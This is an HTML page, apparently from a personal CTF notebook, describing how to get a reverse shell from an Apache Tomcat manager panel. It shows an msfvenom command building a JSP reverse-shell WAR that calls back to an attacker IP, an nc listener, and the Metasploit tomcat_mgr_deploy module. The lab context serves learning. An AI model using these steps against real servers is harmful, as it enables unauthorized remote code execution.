@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Manager Panel - Upload shell</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># Manager Panel - Upload shell</h1></strong><br />If you have access to the <code>/manager/html</code> panel, you can upload a .war archive and get a shell on the system<br /><br /><strong><h3>a) Manually</h3></strong><br />You can do it manually by generating a .war with msfvenom and uploading it<br /><br />Generate <code>.war</code> jsp reverse shell using <code>msfvenom</code>.<br /><div class="codebox"><div class="codebox">root@gotham:~/ctf/jerry#&nbsp;msfvenom&nbsp;-p&nbsp;java/jsp_shell_reverse_tcp&nbsp;LHOST=10.10.14.25&nbsp;LPORT=9001&nbsp;-f&nbsp;war&nbsp;-o&nbsp;lulz.war<br />Payload&nbsp;size:&nbsp;1097&nbsp;bytes<br />Final&nbsp;size&nbsp;of&nbsp;war&nbsp;file:&nbsp;1097&nbsp;bytes<br />Saved&nbsp;as:&nbsp;lulz.war</div></div><br /><br />Upload your <code>.war</code> reverse shell.<br /><a href=""><img src="images/142-1.png" alt="images/142-1.png" /></a><br /><br />You should see your <code>.war</code> file under <em>Applications</em> (mine is <code>lulz</code>)<br /><a href=""><img src="images/142-2.png" alt="images/142-2.png" /></a><br /><br />Start a listener on your attacking machine to receive the shell<br /><div class="codebox"><div class="codebox">root@gotham:~/ctf/jerry/8080#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br />listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...</div></div><br /><br />And run your uploaded .war by visiting to link to you reverse shell under <em>Applications</em>.<br /><br /><strong><h3>b) metasploit tomcat_mgr_deploy</h3></strong><br />The metasploit module <code>tomcat_mgr_deploy</code> will get a shell for you - self explanatory.<br />Make sure to set the tomcat username and password</div>
+</body>
+</html>
